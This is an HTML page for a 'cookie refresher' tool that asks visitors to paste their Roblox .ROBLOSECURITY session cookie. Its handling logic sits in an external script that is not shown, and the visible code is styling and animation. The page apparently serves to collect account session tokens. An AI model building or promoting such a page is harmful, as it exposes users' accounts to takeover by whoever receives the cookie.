<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Cookie Refresher</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Icons & Fonts -->
    <link rel="icon" href="logo.ico" type="image/x-icon">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;800&family=Montserrat:wght@300;500;700&display=swap" rel="stylesheet">

    <!-- FontAwesome -->
    <script src="https://kit.fontawesome.com/b617dc6679.js" crossorigin="anonymous"></script>

    <style>
        /* ---------- GLOBAL BACKGROUND ---------- */
        body {
            margin: 0;
            font-family: 'Montserrat', sans-serif;
            background: #000;
            overflow: hidden;
            height: 100vh;
            color: white;
        }

        /* Animated star particles */
        .stars {
            position: fixed;
            width: 100%;
            height: 100%;
            background: transparent;
            top: 0;
            left: 0;
            z-index: -3;
            overflow: hidden;
        }

        .star {
            position: absolute;
            width: 2px;
            height: 2px;
            background: white;
            opacity: 0.6;
            animation: twinkle 2s infinite ease-in-out;
        }

        @keyframes twinkle {
            0% { opacity: 0.2; transform: scale(1); }
            50% { opacity: 1; transform: scale(1.8); }
            100% { opacity: 0.2; transform: scale(1); }
        }

        /* ---------- CENTER PANEL ---------- */
        #container {
            width: 450px;
            margin: 0 auto;
            margin-top: 7vh;
            padding: 35px;
            border-radius: 20px;
            background: rgba(20, 20, 30, 0.45);
            backdrop-filter: blur(12px);
            box-shadow: 0 0 40px rgba(160, 60, 255, 0.35);
            border: 1px solid rgba(150, 0, 255, 0.5);
            text-align: center;
            animation: fadeIn 1.2s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* ---------- TITLE TYPOGRAPHY ---------- */
        .title {
            font-family: 'Orbitron', sans-serif;
            font-size: 26px;
            letter-spacing: 2px;
            margin-bottom: 10px;
            text-shadow: 0 0 18px #b46bff;
            animation: glowPulse 3.5s infinite ease-in-out;
        }

        @keyframes glowPulse {
            0% { text-shadow: 0 0 12px #a34dff; }
            50% { text-shadow: 0 0 25px #da9aff; }
            100% { text-shadow: 0 0 12px #a34dff; }
        }

        /* ---------- INPUT ---------- */
        #authCookie {
            width: 100%;
            padding: 15px;
            margin-top: 15px;
            color: white;
            font-size: 15px;
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.45);
            border: 1px solid #6800b5;
            outline: none;
            transition: all 0.3s;
        }

        #authCookie:focus {
            border-color: #d28aff;
            box-shadow: 0 0 12px #b575ff;
        }

        /* ---------- BUTTONS ---------- */
        .futuristic-btn {
            width: 100%;
            padding: 16px;
            margin-top: 15px;
            border-radius: 14px;
            border: none;
            font-size: 17px;
            font-weight: 700;
            color: white;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #7a00ff, #c200ff);
            box-shadow: 0 0 18px rgba(180, 90, 255, 0.4);
            transition: all 0.28s ease;
        }

        .futuristic-btn:hover {
            cursor: pointer;
            transform: scale(1.08);
            box-shadow: 0 0 25px rgba(220, 140, 255, 0.85);
            background: linear-gradient(135deg, #9a34ff, #e2a4ff);
        }

        /* Refresh icon */
        #refreshButtonIcon {
            width: 22px;
            margin-right: 8px;
            opacity: 0.9;
        }
        .spin {
            animation: spin 1.2s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0); }
            to { transform: rotate(360deg); }
        }

        /* ---------- RESULT BOX ---------- */
        #result {
            background: rgba(40, 40, 50, 0.65);
            border: 1px solid rgba(140, 0, 255, 0.4);
            padding: 12px;
            margin-top: 15px;
            border-radius: 12px;
            font-size: 14px;
            white-space: nowrap;
            overflow-x: auto;
        }

        /* ---------- DISCORD BUTTON ---------- */
        .discord {
            margin-top: 20px;
            font-size: 32px;
            color: #777;
            transition: all 0.3s ease;
            display: inline-block;
        }

        .discord:hover {
            transform: scale(1.2);
            color: #c785ff;
            text-shadow: 0 0 15px #ce8fff;
        }

        /* Copyright */
        #copyright {
            margin-top: 18px;
            font-size: 13px;
            opacity: 0.7;
            transition: 0.3s;
        }
        #copyright:hover {
            opacity: 1;
            color: #d79aff;
        }

    </style>
</head>

<body>

    <!-- STAR PARTICLES -->
    <div class="stars" id="starField"></div>

    <!-- MAIN PANEL -->
    <div id="container">
        <h3 class="title">CKREF COOKIE REFRESHER</h3>

        <img src="kshitlogo.jpg" width="55" style="border-radius: 50%; margin-bottom: 10px;">

        <form id="cookieForm">
            <input type="text" id="authCookie" placeholder="Enter your .ROBLOSECURITY Cookie" required>

            <button type="button" id="refreshButton" class="futuristic-btn">
                <img id="refreshButtonIcon" src="https://cdn.discordapp.com/attachments/1151865698738520144/1152915992477962360/black-n-white-white-refresh-icon-png-clipart-removebg-preview.png">
                Refresh Cookie
            </button>
        </form>

        <div id="result"></div>

        <button id="copyButton" class="futuristic-btn">Copy Cookie</button>
        <p id="countdown"></p>

        <div>
            <a href="https://discord.gg/CCrmJ5T77y" target="_blank" class="discord">
                <i class="fab fa-discord"></i>
            </a>
        </div>

        <p id="copyright">Â© allqvoidhp</p>
    </div>


    <!-- SCRIPTS -->
    <script src="script.js"></script>

    <script>
        /* ----------- STAR PARTICLE GENERATOR ----------- */
        const starField = document.getElementById("starField");

        function spawnStars() {
            for (let i = 0; i < 85; i++) {
                let star = document.createElement("div");
                star.className = "star";
                star.style.top = Math.random() * 100 + "vh";
                star.style.left = Math.random() * 100 + "vw";
                star.style.animationDelay = Math.random() * 3 + "s";
                starField.appendChild(star);
            }
        }
        spawnStars();


        /* ----------- REFRESH BUTTON SPIN ANIMATION ----------- */
        const refreshButton = document.getElementById("refreshButton");
        const refreshIcon = document.getElementById("refreshButtonIcon");

        refreshButton.addEventListener("click", () => {
            refreshIcon.classList.add("spin");
            setTimeout(() => refreshIcon.classList.remove("spin"), 2000);
        });
    </script>

</body>
</html>
